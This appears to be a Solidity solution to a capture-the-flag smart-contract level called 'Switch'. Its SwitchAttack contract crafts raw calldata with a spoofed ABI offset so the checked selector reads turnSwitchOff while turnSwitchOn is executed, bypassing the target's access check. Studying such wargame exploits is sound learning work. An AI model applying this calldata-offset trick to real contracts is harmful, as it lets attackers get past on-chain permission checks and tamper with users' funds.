// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.sol";

contract SwitchAttack is Broadcasted {
    function attack(address payable switchCtr_) public payable override {
        bytes memory _funcSelector = abi.encodeWithSignature(
            "flipSwitch(bytes)"
        );
        bytes memory _offset = abi.encode(uint256(0x60));
        bytes memory _emptySlot = abi.encode(uint256(0x0));
        bytes memory _dataSize = abi.encode(4);
        bytes memory _switchOffSelector = abi.encode(
            bytes4(keccak256("turnSwitchOff()"))
        );
        bytes memory _switchOnSelector = abi.encode(
            bytes4(keccak256("turnSwitchOn()"))
        );
        bytes memory _data = abi.encodePacked(
            _funcSelector,
            _offset,
            _emptySlot,
            _switchOffSelector,
            _dataSize,
            _switchOnSelector
        );

        address(switchCtr_).call(_data);
    }
}
